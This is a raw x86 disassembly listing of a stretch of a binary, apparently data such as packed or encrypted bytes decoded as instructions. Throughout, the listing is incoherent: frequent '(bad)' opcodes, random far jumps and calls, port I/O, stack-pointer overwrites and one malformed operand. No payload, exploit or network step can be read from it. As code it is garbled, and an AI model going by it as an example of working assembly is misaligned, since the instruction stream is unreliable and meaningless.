  427435:	add    ch,ch
  427437:	lods   eax,DWORD PTR ds:[esi]
  427438:	clc    
  427439:	inc    esp
  42743a:	jp     0x4273fd
  42743c:	xor    BYTE PTR [eax+ecx*2],dl
  42743f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427440:	(bad)  
  427441:	fmul   QWORD PTR [edi-0x16256f2b]
  427447:	pop    edx
  427448:	pusha  
  427449:	and    eax,0xfab1408d
  42744e:	mov    dh,bh
  427450:	call   0xf6c9fa64
  427455:	inc    edi
  427456:	arpl   WORD PTR [edi+0x5c7d58bf],dx
  42745c:	popf   
  42745d:	ins    DWORD PTR es:[edi],dx
  42745e:	jno    0x42743d
  427460:	es push eax
  427462:	mov    edi,0xf29cbfcd
  427467:	mov    esp,0x7b6d1ee2
  42746c:	mov    ?,ebp
  42746e:	lea    eax,[eax]
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	pop    ebp
  427487:	sub    esi,DWORD PTR [ebx+0x1ea6c6b]
  42748d:	add    ch,bh
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR [eax-0x31],dl
  427494:	ins    DWORD PTR es:[edi],dx
  427495:	call   0x2782a3b1
  42749a:	(bad)  
  42749b:	sub    eax,0x72693def
  4274a0:	ret    
  4274a1:	jle    0x427477
  4274a3:	stc    
  4274a4:	in     al,dx
  4274a5:	cmp    edi,DWORD PTR [edx]
  4274a7:	pop    ebx
  4274a8:	add    eax,0x29c1759
  4274ad:	push   ebx
  4274ae:	lahf   
  4274af:	add    edx,ecx
  4274b1:	stos   BYTE PTR es:[edi],al
  4274b2:	jle    0x4274f6
  4274b4:	or     esp,DWORD PTR [esi+eiz*2-0x6d]
  4274b8:	sub    edi,ebp
  4274ba:	sub    eax,0x453c3198
  4274bf:	push   0xffffffee
  4274c1:	push   esp
  4274c2:	inc    ecx
  4274c3:	mov    bl,0xc9
  4274c5:	imul   esi,esi,0x2f481be3
  4274cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274cc:	inc    ebx
  4274cd:	jl     0x427500
  4274cf:	ja     0x427490
  4274d1:	aas    
  4274d2:	or     BYTE PTR [edi-0x4d],al
  4274d5:	xchg   esp,eax
  4274d6:	mov    ch,0xd4
  4274d8:	fprem1 
  4274da:	mov    edx,DWORD PTR [ecx+0x2802677]
  4274e0:	stc    
  4274e1:	mov    esp,0x5a4aef30
  4274e6:	inc    edx
  4274e7:	push   0xffffffc6
  4274e9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4274eb:	outs   dx,DWORD PTR ds:[esi]
  4274ec:	lods   eax,DWORD PTR ds:[esi]
  4274ed:	ss pusha 
  4274ef:	sbb    BYTE PTR [edx+0x2cc327e6],bh
  4274f5:	sub    al,0x6f
  4274f7:	pop    es
  4274f8:	cld    
  4274f9:	dec    edx
  4274fa:	xor    ebp,DWORD PTR [ebp+0x2f]
  4274fd:	mov    dl,0xf6
  4274ff:	popa   
  427500:	(bad)  
  427501:	cmp    eax,0x7b5b6917
  427506:	push   edx
  427507:	(bad)  
  427508:	loopne 0x427525
  42750a:	xchg   esi,eax
  42750b:	inc    ebx
  42750c:	push   ebp
  42750d:	cwde   
  42750e:	in     al,0x8d
  427510:	aas    
  427511:	cmp    al,0x60
  427513:	ss pop ds
  427515:	push   edx
  427516:	icebp  
  427517:	sub    DWORD PTR [ecx+0x34ca0b83],ebx
  42751d:	push   ds
  42751e:	lea    ecx,[ecx+eax*4+0x3d]
  427522:	popf   
  427523:	into   
  427524:	in     al,dx
  427525:	xchg   esi,eax
  427526:	push   0x2c77a1ea
  42752b:	sub    ch,bl
  42752d:	dec    esp
  42752e:	adc    eax,0x1f8f522f
  427533:	add    DWORD PTR [edx-0x7ec6a53c],edi
  427539:	pushf  
  42753a:	fs in  eax,dx
  42753c:	xor    DWORD PTR [edx],ecx
  42753e:	push   edi
  42753f:	sbb    edx,esi
  427541:	ror    ecx,1
  427543:	push   edi
  427544:	pushf  
  427545:	fadd   QWORD PTR [ebx+0x2e]
  427548:	jo     0x427590
  42754a:	movq   mm4,QWORD PTR [edi-0x40]
  42754e:	inc    esi
  42754f:	and    eax,0xef6e0552
  427554:	mov    bh,0xe9
  427556:	sbb    DWORD PTR [ebx],eax
  427558:	push   edi
  427559:	dec    esp
  42755a:	bound  edx,QWORD PTR [ebp-0x4334664e]
  427560:	pusha  
  427561:	int    0x2f
  427563:	retf   0xc76f
  427566:	xor    al,0xdd
  427568:	xchg   DWORD PTR [ebx],edi
  42756a:	iret   
  42756b:	mov    eax,ebp
  42756d:	fadd   DWORD PTR [eax-0x49]
  427570:	pusha  
  427571:	mov    ecx,0xe8e9d4a4
  427576:	mov    al,ds:0x7744aa58
  42757b:	popa   
  42757c:	lahf   
  42757d:	jle    0x42752a
  42757f:	or     BYTE PTR [eax],0xd8
  427582:	jbe    0x4275e9
  427584:	hlt    
  427585:	fwait
  427586:	and    eax,DWORD PTR [ecx-0x33cbaaa8]
  42758c:	pushf  
  42758d:	mov    DWORD PTR [edx+0x59],eax
  427590:	aas    
  427591:	test   BYTE PTR [eax+eax*1+0x52],al
  427595:	pusha  
  427596:	jp     0x427610
  427598:	and    al,0xf7
  42759a:	fsubr  DWORD PTR [ecx-0x1026811b]
  4275a0:	and    al,0xd0
  4275a2:	sub    BYTE PTR [ebp-0x5f03252],0x79
  4275a9:	hlt    
  4275aa:	enter  0xfc15,0x0
  4275ae:	add    edi,edi
  4275b0:	nop
  4275b1:	outs   dx,BYTE PTR ds:[esi]
  4275b2:	pop    eax
  4275b3:	lahf   
  4275b4:	das    
  4275b5:	(bad)  
  4275b6:	aaa    
  4275b7:	daa    
  4275b8:	mov    al,0x7e
  4275ba:	xchg   ebp,eax
  4275bb:	enter  0x1aff,0xf4
  4275bf:	jbe    0x42759e
  4275c1:	aam    0x29
  4275c3:	or     eax,0x4787c284
  4275c8:	sbb    esi,DWORD PTR [esi]
  4275ca:	mov    eax,0x7e029acf
  4275cf:	dec    eax
  4275d0:	add    BYTE PTR [edi],dl
  4275d2:	rol    DWORD PTR [ebx+edx*1+0x32],cl
  4275d6:	push   edx
  4275d8:	jnp    0x4275b2
  4275da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275db:	daa    
  4275dc:	push   eax
  4275dd:	pop    ecx
  4275de:	lahf   
  4275df:	daa    
  4275e0:	out    0xab,eax
  4275e2:	jle    0x42758f
  4275e4:	out    0x29,eax
  4275e6:	and    ah,al
  4275e8:	mov    dl,0xbb
  4275ea:	dec    edx
  4275eb:	(bad)  
  4275ec:	xor    ecx,DWORD PTR [edi-0x55c80ffe]
  4275f2:	xchg   ebx,eax
  4275f3:	xor    al,0x32
  4275f5:	pushf  
  4275f6:	push   eax
  4275f7:	(bad)  
  4275f8:	fadd   DWORD PTR [edi+ecx*2+0x32]
  4275fc:	je     0x4275c4
  4275fe:	scas   al,BYTE PTR es:[edi]
  4275ff:	mov    edi,0x329b13ea
  427604:	xor    al,0x36
  427606:	dec    ebx
  427607:	add    BYTE PTR [esi-0x5b],ch
  42760a:	push   ebp
  42760b:	cmp    BYTE PTR [ecx-0x73],bh
  42760e:	adc    eax,0x3d465735
  427613:	sahf   
  427614:	fcmove st,st(5)
  427616:	add    BYTE PTR [edx+0x69db3f4b],0xaa
  42761d:	je     0x4275d8
  42761f:	(bad)  
  427620:	(bad)  [edx]
  427622:	popa   
  427623:	in     al,dx
  427624:	xor    al,0x8a
  427626:	es push edi
  427628:	and    ah,BYTE PTR [edx+0xd]
  42762b:	inc    edx
  42762c:	mov    al,ds:0x2c762a5c
  427631:	call   ecx
  427633:	cmp    BYTE PTR [eax-0xc1300df],0xe1
  42763a:	jecxz  0x427655
  42763c:	push   0x6625f3fd
  427641:	outs   dx,DWORD PTR ds:[esi]
  427642:	jb     0x42763e
  427644:	jmp    0x76e0:0x2b935d41
  42764b:	ja     0x427674
  42764d:	adc    ch,al
  42764f:	push   edi
  427650:	push   eax
  427651:	inc    ebx
  427652:	fnsave [ecx+0x3fc5badf]
  427658:	into   
  427659:	js     0x427664
  42765b:	div    DWORD PTR [eax]
  42765d:	loopne 0x427675
  42765f:	push   edi
  427660:	pop    edi
  427661:	push   edi
  427662:	sbb    al,BYTE PTR [edi]
  427664:	scas   eax,DWORD PTR es:[edi]
  427665:	fisttp DWORD PTR [ecx+ebp*8+0x5c2a60f0]
  42766c:	(bad)  
  42766d:	mov    ebx,0x99a3c33a
  427672:	and    esi,DWORD PTR [eax+edx*8]
  427675:	xlat   BYTE PTR ds:[ebx]
  427676:	inc    dl
  427678:	inc    ebp
  427679:	test   esp,edi
  42767b:	pusha  
  42767c:	adc    al,0xbd
  42767e:	frstor [edi-0x6b]
  427681:	inc    ebx
  427682:	lea    ebx,[esi+eax*8-0x543efe42]
  427689:	push   edx
  42768a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42768b:	fwait
  42768c:	je     0x42769e
  42768e:	jecxz  0x427690
	...
  427698:	add    BYTE PTR [eax],al
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	inc    ebp
  4276a7:	sbb    al,0x1
  4276a9:	push   edi
  4276aa:	imul   ebp,esp,0x1fd0001
  4276b0:	add    BYTE PTR [eax],al
  4276b2:	mov    DWORD PTR [ebp+0x10162b8a],esp
  4276b8:	add    ebx,ebx
  4276ba:	mov    DWORD PTR [ecx],esp
  4276bc:	cs xchg edi,eax
  4276be:	stc    
  4276bf:	or     BYTE PTR [esi-0x2244c92d],ah
  4276c5:	retf   
  4276c6:	add    DWORD PTR [esi+ebp*8-0x7dd58504],esi
  4276cd:	rol    DWORD PTR [eax+0x790653fc],0x87
  4276d4:	ret    
  4276d5:	add    edi,DWORD PTR [ebp*8+0x4caf517e]
  4276dc:	pop    ebp
  4276dd:	jmp    0x7062a967
  4276e2:	test   BYTE PTR [ecx-0x6ddc5869],ch
  4276e8:	cmp    al,0xcf
  4276ea:	mov    edx,DWORD PTR [ebx]
  4276ec:	out    0x76,eax
  4276ee:	jmp    0x5048:0x5c182a28
  4276f5:	pop    ss
  4276f6:	and    DWORD PTR [edx],esp
  4276f8:	xchg   edx,eax
  4276f9:	mov    ah,0x73
  4276fb:	cld    
  4276fc:	pop    ebp
  4276fd:	add    DWORD PTR [ebx-0x2ee62bde],0xffffffff
  427704:	aam    0x8e
  427706:	repnz xchg ebp,eax
  427708:	mov    edi,0xd361fc74
  42770d:	in     al,dx
  42770e:	clc    
  42770f:	lods   eax,DWORD PTR ds:[esi]
  427710:	jmp    0x2eb372ed
  427715:	xor    al,0x5e
  427717:	adc    ch,BYTE PTR [edx]
  427719:	into   
  42771a:	aad    0x10
  42771c:	pop    ds
  42771d:	dec    esp
  42771e:	ret    
  42771f:	jns    0x4276f3
  427721:	jmp    0xb63d:0x1fab0e80
  427728:	jmp    0x6b3a:0x28a5581f
  42772f:	push   cs
  427730:	shl    DWORD PTR [ebp+0x79],1
  427733:	push   es
  427734:	out    0xfc,al
  427736:	jmp    0x514cc2f9
  42773b:	fdivrp st(0),st
  42773d:	pop    esp
  42773e:	jmp    0x42777d
  427740:	jnp    0x42777f
  427742:	and    BYTE PTR [ebx+0xeaf6aff],0xf8
  427749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42774a:	loopne 0x427711
  42774c:	xchg   ebp,eax
  42774d:	add    cl,BYTE PTR [edi-0x17f9100b]
  427753:	mov    ebp,0x673b8204
  427758:	loope  0x427752
  42775a:	test   dl,bl
  42775c:	cmp    DWORD PTR [ecx-0x4e],0xffffffbf
  427760:	push   edi
  427761:	iret   
  427762:	inc    ebp
  427763:	fwait
  427764:	(bad)  
  427765:	xchg   edi,eax
  427766:	out    dx,eax
  427767:	xchg   ecx,eax
  427768:	push   ebp
  427769:	fincstp 
  42776b:	cmp    edx,DWORD PTR [ecx-0x202ad663]
  427771:	out    dx,al
  427772:	xchg   edi,eax
  427773:	mov    edi,0x41b8708c
  427778:	mov    edi,0xd1fe9a99
  42777d:	mov    ah,0x4
  42777f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427780:	sub    eax,0xec9c2861
  427785:	dec    esi
  427786:	pop    esp
  427787:	lahf   
  427788:	pop    esi
  427789:	dec    edi
  42778a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42778b:	mov    WORD PTR [esi-0x21],es
  42778e:	mov    esp,eax
  427790:	push   edx
  427791:	out    dx,eax
  427792:	icebp  
  427793:	or     al,BYTE PTR [esi]
  427795:	sbb    eax,esi
  427797:	(bad)  [ebx+0x73]
  42779a:	pushf  
  42779b:	je     0x42771e
  42779d:	pop    ss
  42779e:	(bad)  
  42779f:	cmp    al,0x31
  4277a1:	xchg   esp,eax
  4277a2:	ret    0xf8a1
  4277a5:	pop    ebx
  4277a6:	jp     0x4277a8
  4277a8:	sub    bh,BYTE PTR [edi+ecx*2]
  4277ab:	mov    dl,0x3c
  4277ad:	add    esi,DWORD PTR [edx+0x4d76c13a]
  4277b3:	int3   
  4277b4:	xor    esp,0x59
  4277b7:	mov    edi,0x65d1feb3
  4277bc:	cmp    eax,0x4d038a8d
  4277c1:	dec    edi
  4277c2:	(bad)  
  4277c3:	in     eax,dx
  4277c4:	das    
  4277c5:	daa    
  4277c6:	dec    edx
  4277c7:	push   ss
  4277c8:	mov    ecx,0x6e3e033d
  4277cd:	mov    eax,0x706d3abb
  4277d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277d3:	jl     0x427766
  4277d5:	pop    eax
  4277d6:	ret    
  4277d7:	cld    
  4277d8:	xchg   esi,eax
  4277d9:	mov    WORD PTR [ebp+0x26],cs
  4277dc:	leave  
  4277dd:	jbe    0x4277d7
  4277df:	xor    DWORD PTR [edi-0x4b],0xf869d1b0
  4277e6:	mov    al,0xa6
  4277e8:	mov    DWORD PTR [esi+0x3cf6a5dd],ebx
  4277ee:	popf   
  4277ef:	sbb    DWORD PTR [esi-0xb],ecx
  4277f2:	mov    dl,0xc1
  4277f4:	iret   
  4277f5:	mov    esi,DWORD PTR [ecx-0x35]
  4277f8:	icebp  
  4277f9:	mov    cl,0x6f
  4277fb:	add    cl,0xc6
  4277fe:	adc    eax,0x4a8d027f
  427803:	dec    edi
  427804:	adc    esp,ebp
  427806:	arpl   WORD PTR [ecx+esi*2-0x79],dx
  42780a:	mov    edx,0x44189c1
  42780f:	adc    ch,BYTE PTR [ebx+0x18e5bcd3]
  427815:	fnstenv [ecx+0x1b]
  427818:	pop    edx
  427819:	(bad)  
  42781a:	fcom   QWORD PTR cs:[edi+ecx*2-0x35]
  42781f:	cld    
  427820:	sub    bh,BYTE PTR ds:0x93fc9b87
  427826:	fcomp  st(3)
  427828:	ja     0x4277df
  42782a:	sub    DWORD PTR [ecx+0x6ea86bb0],eax
  427830:	icebp  
  427831:	fiadd  WORD PTR [edi-0x7b]
  427834:	jb     0x42786b
  427836:	stos   DWORD PTR es:[edi],eax
  427837:	cmp    esi,eax
  427839:	add    bl,BYTE PTR ss:[ebp+eiz*8+0x1c]
  42783e:	xchg   DWORD PTR [eax-0x58],ecx
  427841:	jle    0x4277ee
  427843:	xor    BYTE PTR [eax-0x2c0100f5],bl
  427849:	sub    dh,BYTE PTR [ecx-0x65]
  42784c:	push   ds
  42784d:	je     0x42781d
  42784f:	adc    DWORD PTR [esi+0x137d8b80],ebp
  427855:	in     eax,0x1e
  427857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427858:	ins    DWORD PTR es:[edi],dx
  427859:	inc    ebx
  42785a:	jp     0x427827
  42785c:	pop    esi
  42785d:	mov    ah,0x4a
  42785f:	jp     0x42788a
  427861:	js     0x42780c
  427863:	mov    ch,BYTE PTR [ecx-0x311c6c51]
  427869:	sahf   
  42786a:	test   eax,0x25897011
  42786f:	iret   
  427870:	jmp    0x703d:0x873d5ce2
  427877:	rcl    DWORD PTR ds:0x2ffbe85d,0x18
  42787e:	and    ah,BYTE PTR ds:0x3d396252
  427884:	push   ecx
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	aam    0x1b
  427888:	dec    eax
  427889:	inc    ecx
  42788a:	test   DWORD PTR [ebx+0x6b],ebx
  42788d:	sub    BYTE PTR [edx-0x4906d1fa],ch
  427893:	pop    ebx
  427894:	stc    
  427895:	(bad)  
  427896:	mov    edi,DWORD PTR [edx]
  427898:	div    DWORD PTR [edi+0x4f]
  42789b:	fcmovu st,st(1)
  42789d:	inc    edx
  42789e:	xchg   ecx,eax
  42789f:	jl     0x427894
  4278a1:	call   0x41c4:0x2816c093
  4278a8:	xchg   ebx,eax
  4278a9:	call   0x10:0x53c68524
	...
  4278b8:	add    BYTE PTR [eax],al
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	dec    ebp
  4278c7:	(bad)  
  4278c9:	and    al,0x66
  4278cb:	out    dx,al
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	std    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [eax+edx*8-0xe],dl
  4278d5:	inc    edi
  4278d6:	mov    ah,0x61
  4278d8:	test   eax,0xa1f19559
  4278dd:	ins    DWORD PTR es:[edi],dx
  4278de:	ja     0x42792a
  4278e0:	mov    ss,WORD PTR [edi+eax*1]
  4278e3:	dec    ebx
  4278e4:	loopne 0x42794d
  4278e6:	sub    al,BYTE PTR ds:0xa06d89a6
  4278ec:	jb     0x427955
  4278ee:	js     0x42793f
  4278f0:	or     ebx,DWORD PTR [esi+0x31]
  4278f3:	scas   eax,DWORD PTR es:[edi]
  4278f4:	jne    0x42789c
  4278f6:	mov    esi,0xe4b1e6ed
  4278fb:	inc    eax
  4278fc:	cmp    dl,BYTE PTR es:[edi+0x49]
  427900:	cmp    eax,0x3b157dd6
  427905:	xor    cl,BYTE PTR [esi]
  427907:	retf   
  427908:	mov    edx,0xd92f330d
  42790d:	test   al,0x3a
  42790f:	sub    ch,BYTE PTR [edi-0x2da3e3ee]
  427915:	fild   QWORD PTR [ebx+0x2b7a2849]
  42791b:	cmp    DWORD PTR [esi+0x32fcca57],0xc43c471c
  427925:	dec    esp
  427926:	sbb    eax,0x9429c913
  42792b:	adc    bl,BYTE PTR ds:0x5e4517f0
  427931:	fcomi  st,st(1)
  427933:	and    ebx,DWORD PTR [eax+0x0]
  427936:	cmp    dl,bh
  427938:	xchg   BYTE PTR [edi+0x5c249f09],ah
  42793e:	das    
  42793f:	shr    DWORD PTR [ebp-0x53],0xc8
  427943:	xor    al,0x41
  427945:	imul   ebp,DWORD PTR [edi-0x50],0x6e
  427949:	add    eax,0x1298cf11
  42794e:	sbb    al,0xeb
  427950:	jae    0x427983
  427952:	push   edx
  427953:	dec    ebx
  427954:	mov    eax,DWORD PTR [edx-0x79]
  427957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427958:	jp     0x427965
  42795a:	pop    es
  42795b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42795c:	adc    eax,0xc45ab459
  427961:	sub    DWORD PTR [ebx+0x75],esp
  427964:	push   es
  427965:	mov    ebx,0x848726dd
  42796a:	fdiv   DWORD PTR [esi+0x5f]
  42796d:	add    al,0xea
  42796f:	clc    
  427970:	dec    edx
  427971:	sub    edi,ebp
  427973:	push   eax
  427974:	sub    eax,0xaf4b9b56
  427979:	jo     0x4279b8
  42797b:	dec    esi
  42797c:	mov    bl,0xe0
  42797e:	cmc    
  42797f:	jl     0x427974
  427981:	and    eax,0x208823d2
  427986:	sbb    al,0x87
  427988:	call   0x313:0x669bb5a7
  42798f:	jae    0x42791c
  427991:	jp     0x4279b2
  427993:	or     edx,ebx
  427995:	adc    DWORD PTR [ebx+edi*1+0x5a],0x24816ae4
  42799d:	jl     0x42796f
  42799f:	in     al,0x58
  4279a1:	stc    
  4279a2:	jbe    0x4279c7
  4279a4:	or     ecx,ebx
  4279a6:	call   DWORD PTR ds:0xc4e3cc8a
  4279ac:	jae    0x427a29
  4279ae:	or     bl,BYTE PTR [ecx+0x40c06060]
  4279b4:	sub    DWORD PTR [ebp+ebp*8-0x26],ebx
  4279b8:	cmp    BYTE PTR [esi-0x600c4bb1],bh
  4279be:	fwait
  4279bf:	inc    eax
  4279c0:	ja     0x42796a
  4279c2:	push   0xcf99b9f6
  4279c7:	mov    edi,0x2c3b16b
  4279cc:	mov    eax,0x9305c67c
  4279d1:	xchg   esi,eax
  4279d2:	into   
  4279d3:	add    DWORD PTR [ecx-0x17e25bfa],eax
  4279d9:	sar    BYTE PTR [edi+edi*2+0x77],cl
  4279dd:	fwait
  4279de:	loop   0x4279ae
  4279e0:	sbb    eax,0x16b6abc3
  4279e5:	and    BYTE PTR [ecx+ebx*1],bh
  4279e8:	adc    bh,ah
  4279ea:	fwait
  4279eb:	dec    ecx
  4279ec:	push   0x22
  4279ee:	pushf  
  4279ef:	sbb    al,0xf
  4279f1:	or     al,0xce
  4279f3:	iret   
  4279f4:	mov    ds:0x4f6afa9f,al
  4279f9:	loopne 0x42798c
  4279fb:	jle    0x4279bd
  4279fd:	dec    eax
  4279fe:	test   DWORD PTR [edi-0x7f],eax
  427a01:	or     eax,DWORD PTR [ecx]
  427a03:	add    edx,ebp
  427a05:	dec    esi
  427a06:	jne    0x4279b4
  427a08:	dec    edi
  427a09:	jge    0x4279f4
  427a0b:	xchg   BYTE PTR [eax*8-0x2cc4b160],ch
  427a12:	imul   ebp,DWORD PTR [ecx-0x22],0x2b
  427a16:	pop    ebp
  427a17:	jne    0x4279c5
  427a19:	mov    al,ds:0x29eb6d07
  427a1e:	fld    QWORD PTR cs:[edx]
  427a21:	pop    ss
  427a22:	pop    es
  427a23:	push   cs
  427a24:	xor    BYTE PTR [edi+0x6b],dh
  427a27:	icebp  
  427a28:	popf   
  427a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a2a:	and    cl,dh
  427a2c:	nop
  427a2d:	out    0x8e,al
  427a2f:	pop    edx
  427a30:	test   DWORD PTR [ecx],0xaa8d9f12
  427a36:	fisttp QWORD PTR [edx]
  427a38:	mov    dl,0xca
  427a3a:	mov    ds:0xf790e72a,eax
  427a3f:	aam    0x38
  427a41:	jae    0x4279fb
  427a43:	cmc    
  427a44:	add    eax,0xb362198e
  427a49:	xchg   esi,eax
  427a4a:	pop    esi
  427a4b:	rcr    al,0xb3
  427a4e:	pop    ecx
  427a4f:	fistp  QWORD PTR [ecx-0x4ff92934]
  427a55:	inc    esi
  427a56:	dec    esp
  427a57:	jns    0x427a67
  427a59:	je     0x427a39
  427a5b:	arpl   WORD PTR [eax-0x6da0056f],ax
  427a61:	ss pop ecx
  427a63:	adc    esi,DWORD PTR [edi+0x259ba37c]
  427a69:	rol    BYTE PTR [ebx],0xfc
  427a6c:	aaa    
  427a6d:	test   al,0x0
  427a6f:	scas   al,BYTE PTR es:[edi]
  427a70:	mov    al,0x27
  427a72:	ins    DWORD PTR es:[edi],dx
  427a73:	jne    0x427a15
  427a75:	push   ecx
  427a76:	dec    ebp
  427a77:	jl     0x427ac2
  427a79:	fs push eax
  427a7b:	xor    eax,0xb30544b0
  427a80:	sahf   
  427a81:	jle    0x427a90
  427a83:	loopne 0x427a7c
  427a85:	test   al,0x86
  427a87:	(bad)  
  427a88:	loope  0x427ae8
  427a8a:	add    DWORD PTR [esi+0x3a881add],ebx
  427a90:	inc    ebx
  427a91:	sbb    al,bl
  427a93:	test   al,ah
  427a95:	jg     0x427af2
  427a97:	dec    eax
  427a98:	inc    ebx
  427a99:	ret    
  427a9a:	in     al,0xb0
  427a9c:	xchg   esi,eax
  427a9d:	push   esp
  427a9e:	mov    eax,0xb01e99c3
  427aa3:	ret    
  427aa4:	stos   DWORD PTR es:[edi],eax
  427aa5:	jp     0x427a65
  427aa7:	cdq    
  427aa8:	lods   eax,DWORD PTR ds:[esi]
  427aa9:	push   edx
  427aaa:	dec    ecx
  427aab:	fadd   QWORD PTR [edx]
  427aad:	pop    eax
  427aae:	stos   BYTE PTR es:[edi],al
  427aaf:	jmp    0x28d2:0x7b5f109
  427ab6:	xchg   edx,eax
  427ab7:	cmp    BYTE PTR [ecx+0x45],0xa7
  427abb:	(bad)  
  427abd:	pop    ds
  427abe:	clc    
  427abf:	fs mov ah,0x40
  427ac2:	xchg   ecx,eax
  427ac3:	xchg   esp,eax
  427ac4:	push   ss
  427ac5:	pop    ds
  427ac6:	int    0xdb
  427ac8:	xchg   edi,eax
  427ac9:	in     eax,dx
  427aca:	push   ebx
  427acb:	ins    BYTE PTR es:[edi],dx
  427acc:	dec    edi
  427acd:	jo     0x427b3f
	...
  427ad7:	add    BYTE PTR [eax],al
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi+0x471e4d6c],di
  427ae8:	int3   
  427ae9:	dec    ebp
  427aea:	arpl   ax,si
  427aec:	add    DWORD PTR [eax],eax
  427aee:	std    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    al,ah
  427af3:	in     al,0xd3
  427af5:	mov    esp,0xb3bd5de7
  427afa:	push   es
  427afb:	out    0x92,eax
  427afd:	fist   WORD PTR [ecx+0x58]
  427b00:	outs   dx,DWORD PTR ds:[esi]
  427b01:	xchg   esp,eax
  427b02:	fwait
  427b03:	das    
  427b04:	test   DWORD PTR [ebx+0x738a2a82],0x1e71a303
  427b0e:	enter  0x81bd,0x54
  427b12:	pusha  
  427b13:	adc    eax,0xaeb23d0
  427b18:	mov    esi,0xb177e9bf
  427b1d:	cmp    DWORD PTR [esp+ecx*1+0x4684ccee],ecx
  427b24:	ret    
  427b25:	and    BYTE PTR [ecx-0x75],ah
  427b28:	pop    ds
  427b29:	inc    edi
  427b2a:	pop    ss
  427b2b:	jg     0x427b8e
  427b2d:	push   es
  427b2e:	sbb    cl,al
  427b30:	jb     0x427add
  427b32:	mov    ah,0x44
  427b34:	(bad)  
  427b35:	jmp    0x427b3f
  427b37:	or     dl,ch
  427b39:	fcomip st,st(5)
  427b3b:	ins    DWORD PTR es:[edi],dx
  427b3c:	xchg   ecx,eax
  427b3d:	pop    edi
  427b3e:	fs call 0x746095d
  427b44:	dec    ebx
  427b45:	jp     0x427b68
  427b47:	fwait
  427b48:	(bad)  
  427b49:	xchg   ecx,eax
  427b4a:	mov    al,0xc0
  427b4c:	pop    edx
  427b4d:	mov    ebp,0xa54cea01
  427b52:	adc    ebp,esp
  427b54:	pop    ebp
  427b55:	add    al,0x5e
  427b57:	add    eax,0x51e20776
  427b5c:	(bad)  
  427b5d:	(bad)  
  427b5e:	mov    eax,ds:0xe1275074
  427b63:	mov    edi,0x1742efee
  427b68:	push   ebx
  427b69:	aaa    
  427b6a:	inc    edi
  427b6b:	sbb    ah,BYTE PTR [ecx]
  427b6d:	lds    eax,FWORD PTR [ecx]
  427b6f:	lds    ebx,FWORD PTR [edi]
  427b71:	loop   0x427b34
  427b73:	dec    esp
  427b74:	mov    dx,0x4d41
  427b78:	push   edi
  427b79:	lds    ebp,FWORD PTR [ecx-0x3e]
  427b7c:	mov    dh,0xf8
  427b7e:	out    0xf9,eax
  427b80:	icebp  
  427b81:	mov    edi,0x454a85ea
  427b86:	hlt    
  427b87:	inc    edx
  427b88:	test   DWORD PTR [ebx+0x58],0x2162464
  427b8f:	pop    edi
  427b90:	mov    BYTE PTR [edx+0x209ecbb7],dh
  427b96:	inc    edi
  427b97:	jnp    0x427b5a
  427b99:	iret   
  427b9a:	mov    dl,0x2a
  427b9c:	outs   dx,BYTE PTR ds:[esi]
  427b9d:	lods   eax,DWORD PTR ds:[esi]
  427b9e:	rol    DWORD PTR [edx-0x32],cl
  427ba1:	repz mov esi,0xd23cb349
  427ba7:	jmp    0x82f8:0x9a770a3b
  427bae:	in     al,dx
  427baf:	add    ebp,DWORD PTR [ebx]
  427bb1:	dec    esi
  427bb2:	(bad)  
  427bb4:	jmp    FWORD PTR [esi+eiz*8]
  427bb7:	retf   0x7c0b
  427bba:	mov    edx,0x4f9c3012
  427bbf:	push   es
  427bc0:	test   al,0xe4
  427bc2:	iret   
  427bc3:	fmul   DWORD PTR [edi-0x1a]
  427bc6:	or     ebx,DWORD PTR [ecx-0x7797ba4a]
  427bcc:	les    esi,FWORD PTR [eax+0x609be0cc]
  427bd2:	addr16 mov eax,0xee6f1487
  427bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bd9:	push   DWORD PTR [edx-0x401fb093]
  427bdf:	and    DWORD PTR [ecx-0x5f26493f],ebx
  427be5:	xchg   ecx,eax
  427be6:	ds xchg ah,ah
  427be9:	add    DWORD PTR [ebx+ecx*2-0xee238c1],0x44
  427bf1:	ins    DWORD PTR es:[edi],dx
  427bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bf3:	jae    0x427b8e
  427bf5:	sar    edi,cl
  427bf7:	sbb    eax,DWORD PTR [ecx]
  427bf9:	sub    ebp,DWORD PTR [edx]
  427bfb:	mov    BYTE PTR [edi],dl
  427bfd:	cli    
  427bfe:	(bad)  
  427bff:	bound  edi,QWORD PTR [eax+0xe]
  427c02:	mov    ch,0x2
  427c04:	(bad)  
  427c05:	clc    
